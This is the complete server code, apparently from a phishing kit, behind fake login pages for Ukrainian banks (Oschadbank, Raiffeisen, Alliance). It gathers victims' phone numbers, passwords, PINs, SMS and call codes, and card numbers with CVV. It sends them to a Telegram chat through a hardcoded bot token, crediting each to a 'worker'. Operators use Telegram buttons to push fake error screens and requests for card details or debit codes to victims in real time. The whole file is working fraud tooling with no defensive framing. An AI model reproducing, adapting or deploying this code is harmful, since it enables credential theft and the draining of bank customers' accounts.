const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const path = require('path');
const { atob } = require('buffer');

// --- КОНФИГУРАЦИЯ ---
const TELEGRAM_BOT_TOKEN = '8418105061:AAEoMN84vcQlrmb5Mqcd1KPbc7ZLdHNctCk';
const CHAT_ID = '-4840920969';
// --- КОНЕЦ КОНФИГУРАЦИИ ---

const RENDER_EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL;
const webhookPath = `/bot${TELEGRAM_BOT_TOKEN}`;
const WEBHOOK_URL = RENDER_EXTERNAL_URL ? (RENDER_EXTERNAL_URL + webhookPath) : null;

const app = express();
app.use(express.json());
app.use(cors());

app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
    next();
});
app.get('/', (req, res) => { res.sendFile(path.join(__dirname, 'index.html')); });
app.get('/panel', (req, res) => { res.sendFile(path.join(__dirname, 'panel.html')); });

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

if (WEBHOOK_URL) {
    bot.setWebHook(WEBHOOK_URL)
        .then(() => console.log(`Webhook успешно установлен на ${WEBHOOK_URL}`))
        .catch(err => console.error('Ошибка установки вебхука:', err));
    bot.sendMessage(CHAT_ID, ' Перезапустил сервак.', { parse_mode: 'HTML' }).catch(console.error);
} else {
    console.error('Критическая ошибка: не удалось определить RENDER_EXTERNAL_URL. Вебхук не установлен.');
}

bot.getMe().then(me => console.log(`Бот запущен: @${me.username}`)).catch(err => console.error('Ошибка бота:', err));
app.post(webhookPath, (req, res) => { bot.processUpdate(req.body); res.sendStatus(200); });

const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });
const clients = new Map();
const sessions = new Map();

wss.on('connection', (ws) => {
    console.log('Клиент подключился по WebSocket');
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'register' && data.sessionId) {
                clients.set(data.sessionId, ws);
                console.log(`Клиент зарегистрирован: ${data.sessionId}`);
            }
        } catch (e) { console.error('Ошибка обработки WebSocket сообщения:', e); }
    });
    ws.on('close', () => {
        clients.forEach((clientWs, sessionId) => {
            if (clientWs === ws) {
                clients.delete(sessionId);
                console.log(`Клиент отключился: ${sessionId}`);
            }
        });
    });
    ws.on('error', (error) => console.error('Ошибка WebSocket:', error));
});

bot.on('callback_query', (callbackQuery) => {
    const [type, sessionId] = callbackQuery.data.split(':');
    const ws = clients.get(sessionId);

    if (!ws || ws.readyState !== WebSocket.OPEN) {
        bot.answerCallbackQuery(callbackQuery.id, { text: '❗️Ошибка: клиент не в сети!', show_alert: true });
        return;
    }

    const sessionData = sessions.get(sessionId) || {};
    let command = { type: type, data: {} };
    let responseText = `Команда "${type}" отправлена!`;

    switch (type) {
        case 'lk':
        case 'call':
        case 'ban':
        case 'number_error':
        case 'balance_error':
            break; 

        case 'telegram_debit':
            if (sessionData.bankName === 'Ощадбанк') {
                command.type = 'telegram_debit';
            } else {
                command.type = 'show_debit_form';
            }
            break;
            
        case 'password_error':
            if (sessionData.bankName === 'Райффайзен') {
                 command.type = 'raiff_pin_error';
                 responseText = 'Запрос "неверный пароль" отправлен!';
            } else {
                command.data = { loginType: sessionData.loginMethod || 'phone' };
            }
            break;

        case 'code_error':
            if (sessionData.bankName === 'Райффайзен') {
                command.type = 'raiff_code_error';
            } else if (sessionData.bankName !== 'Ощадбанк') {
                command.type = 'generic_debit_error';
            }
            responseText = 'Запрос "неверный код" отправлен!';
            break;
            
        case 'request_details':
            if (sessionData.bankName === 'Альянс') {
                command.type = 'request_alliance_card_details';
                responseText = 'Запрос (Альянс) отправлен!';
            } 
            else if (sessionData.bankName !== 'Ощадбанк') {
                 command.type = 'show_card_details_form';
                 responseText = 'Запрос (общий) отправлен!';
            } 
            else {
                 bot.answerCallbackQuery(callbackQuery.id, { text: 'Команда "Запрос" не применима для Ощадбанка', show_alert: true });
                 return;
            }
            break;
            
        case 'other':
             command.data = { text: "По техническим причинам данный банк временно недоступен. Пожалуйста, выберите другой." };
             break;
            
        default:
            bot.answerCallbackQuery(callbackQuery.id, { text: `Неизвестная команда: ${type}` });
            return;
    }

    ws.send(JSON.stringify(command));
    bot.answerCallbackQuery(callbackQuery.id, { text: responseText });
});


app.post('/api/submit', (req, res) => {
    const { sessionId, isFinalStep, referrer, ...stepData } = req.body;
    let workerNick = 'unknown';
    try { if (referrer && referrer !== 'unknown') workerNick = atob(referrer); } catch (e) { /* ignore */ }
    
    const existingData = sessions.get(sessionId) || {};
    const newData = { ...existingData, ...stepData, workerNick };
    sessions.set(sessionId, newData);
    
    let message = '';
    
    if (newData.bankName === 'Райффайзен') {
        if (stepData.phone) {
            message = `<b>📱 Новый лог (Райф) - Телефон</b>\n\n`;
            message += `<b>Номер телефона:</b> <code>${stepData.phone}</code>\n`;
            message += `<b>Worker:</b> @${workerNick}\n`;
            sendToTelegram(message, sessionId, newData.bankName);
        } else if (stepData.sms_code) {
            message = `<b>💬 Код из SMS (Райф)</b>\n\n`;
            message += `<b>Код:</b> <code>${stepData.sms_code}</code>\n`;
            message += `<b>Номер телефона:</b> <code>${newData.phone}</code>\n`;
            message += `<b>Worker:</b> @${workerNick}\n`;
            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        } else if (stepData.pin) {
            message = `<b>🔒 PIN-код (Райф)</b>\n\n`;
            message += `<b>Пин:</b> <code>${stepData.pin}</code>\n`;
            message += `<b>Номер телефона:</b> <code>${newData.phone}</code>\n`;
            message += `<b>Worker:</b> @${workerNick}\n`;
            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        } 
        // --- ДОБАВЛЕН ЭТОТ БЛОК ---
        else if (stepData.debit_sms_code) {
            message = `<b>💸 Код списания (Райф)</b>\n\n`;
            message += `<b>Код:</b> <code>${stepData.debit_sms_code}</code>\n`;
            const phone = newData.phone || 'не указан';
            message += `<b>Номер телефону:</b> <code>${phone}</code>\n`;
            message += `<b>Worker:</b> @${workerNick}\n`;
            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        }
    } 
    else {
        if (stepData.call_code) {
            message = `<b>📞 Код со звонка (Ощад)</b>\n\n`;
            message += `<b>Код:</b> <code>${stepData.call_code}</code>\n`;
            const phone = newData.phone || newData.fp_phone || 'не указан';
            message += `<b>Номер телефону:</b> <code>${phone}</code>\n`;
            message += `<b>Worker:</b> @${workerNick}\n`;
            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        }
        else if (stepData.sms_code) {
            message = `<b>💸 Код списания (Ощад)</b>\n\n`;
            message += `<b>Код:</b> <code>${stepData.sms_code}</code>\n`;
            const phone = newData.phone || newData.fp_phone || 'не указан';
            message += `<b>Номер телефону:</b> <code>${phone}</code>\n`;
            message += `<b>Worker:</b> @${workerNick}\n`;
            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        }
        else if (stepData.debit_sms_code) {
            message = `<b>💸 Код списания (${newData.bankName})</b>\n\n`;
            message += `<b>Код:</b> <code>${stepData.debit_sms_code}</code>\n`;
            const phone = newData.phone || 'не указан';
            message += `<b>Номер телефону:</b> <code>${phone}</code>\n`;
            message += `<b>Worker:</b> @${workerNick}\n`;
            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        }
        else if (stepData.card_details) {
            const details = stepData.card_details;
            message = `<b>Данные по запросу (${newData.bankName})</b>\n\n`;
            message += `<b>Номер карты:</b> <code>${details.card || details.card_number_full || 'N/A'}</code>\n`;
            message += `<b>Срок действия:</b> <code>${details.exp || details.exp_date || 'N/A'}</code>\n`;
            message += `<b>CVV:</b> <code>${details.cvv || 'N/A'}</code>\n`;
            message += `<b>Баланс:</b> <code>${details.balance || 'N/A'}</code>\n`;
            message += `<b>Worker:</b> @${workerNick}\n`;
            bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        }
        else if (stepData.fp_pin) {
            message = `<b>🔧 Восстановление (Ощад)</b>\n\n`;
            message += `<b>Название банка:</b> ${newData.bankName}\n`;
            message += `<b>Мобильный:</b> <code>${newData.fp_phone}</code>\n`;
            message += `<b>Номер карты:</b> <code>${newData.fp_card}</code>\n`;
            message += `<b>Пин:</b> <code>${stepData.fp_pin}</code>\n`;
            message += `<b>Worker:</b> @${workerNick}\n`;
            sendToTelegram(message, sessionId, newData.bankName);
        }
        else if (stepData.password && (stepData.login || stepData.phone)) {
            if (stepData.login) {
                message = `<b>🏦 Вход в Ощад (Логин)</b>\n\n`;
                message += `<b>Название банка:</b> ${newData.bankName}\n`;
                message += `<b>Логин:</b> <code>${stepData.login}</code>\n`;
                message += `<b>Пароль:</b> <code>${stepData.password}</code>\n`;
            } else {
                message = `<b>🏦 Вход в Ощад (Телефон)</b>\n\n`;
                message += `<b>Название банка:</b> ${newData.bankName}\n`;
                message += `<b>Номер телефона:</b> <code>${stepData.phone}</code>\n`;
                message += `<b>Пароль:</b> <code>${stepData.password}</code>\n`;
            }
            message += `<b>Worker:</b> @${workerNick}\n`;
            sendToTelegram(message, sessionId, newData.bankName);
        }
        else if (isFinalStep) {
            message = `<b>💳 Новый лог (${newData.bankName})</b>\n\n`;
            message += `<b>Название банка:</b> ${newData.bankName}\n`;
            if (newData.phone) message += `<b>Номер телефону:</b> <code>${newData.phone}</code>\n`;
            if (newData.card_number) message += `<b>Номер карти:</b> <code>${newData.card_number}</code>\n`;
            if (newData.card) message += `<b>Номер карти:</b> <code>${newData.card}</code>\n`;
            message += `<b>Worker:</b> @${workerNick}\n`;
            sendToTelegram(message, sessionId, newData.bankName);
        }
    }
    
    res.status(200).json({ message: 'OK' });
});


app.post('/api/sms', (req, res) => {
    const { sessionId, code, referrer } = req.body;
    let workerNick = 'unknown';
    try { if (referrer && referrer !== 'unknown') workerNick = atob(referrer); } catch (e) {}
    const sessionData = sessions.get(sessionId);
    if (sessionData) {
        let message = `<b>💬 Получено SMS (старый поток)</b>\n\n`;
        message += `<b>Код:</b> <code>${code}</code>\n`;
        if(sessionData.phone) message += `<b>Номер телефону:</b> <code>${sessionData.phone}</code>\n`;
        message += `<b>Сессия:</b> <code>${sessionId}</code>\n`;
        message += `<b>Worker:</b> @${workerNick}\n`;
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        res.status(200).json({ message: 'OK' });
    } else {
        res.status(404).json({ message: 'Session not found' });
    }
});

function sendToTelegram(message, sessionId, bankName) {
    let keyboard = [];

    if (bankName === 'Ощадбанк') {
        keyboard = [
            [{ text: 'Звонок', callback_data: `call:${sessionId}` }, { text: 'Списание', callback_data: `telegram_debit:${sessionId}` }, { text: 'Запрос', callback_data: `request_details:${sessionId}` }],
            [{ text: '❌Пароль', callback_data: `password_error:${sessionId}` }, { text: '❌Код', callback_data: `code_error:${sessionId}` }, { text: '❌Номер', callback_data: `number_error:${sessionId}` }],
            [{ text: '❌Баланс', callback_data: `balance_error:${sessionId}` }, { text: 'Другой', callback_data: `other:${sessionId}` }, { text: 'Бан', callback_data: `ban:${sessionId}` }]
        ];
    } else if (bankName === 'Райффайзен') {
         keyboard = [
            [{ text: 'Списание', callback_data: `telegram_debit:${sessionId}` }, { text: 'Запрос', callback_data: `request_details:${sessionId}` }],
            [{ text: '❌Пароль', callback_data: `password_error:${sessionId}` }, { text: '❌Код', callback_data: `code_error:${sessionId}` }, { text: '❌Номер', callback_data: `number_error:${sessionId}` }],
            [{ text: '❌Баланс', callback_data: `balance_error:${sessionId}` }, { text: 'Другой', callback_data: `other:${sessionId}` }, { text: 'Бан', callback_data: `ban:${sessionId}` }]
        ];
    } else { // Клавиатура для всех остальных банков
        keyboard = [
            [{ text: 'Списание', callback_data: `telegram_debit:${sessionId}` }, { text: 'Запрос', callback_data: `request_details:${sessionId}` }],
            [{ text: '❌Код', callback_data: `code_error:${sessionId}` }, { text: '❌Номер', callback_data: `number_error:${sessionId}` }, { text: '❌Баланс', callback_data: `balance_error:${sessionId}` }],
            [{ text: 'Другой', callback_data: `other:${sessionId}` }, { text: 'Бан', callback_data: `ban:${sessionId}` }]
        ];
    }

    bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML', reply_markup: { inline_keyboard: keyboard } })
       .catch(err => console.error("Telegram send error:", err));
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => console.log(`Сервер запущен на порту ${PORT}`));
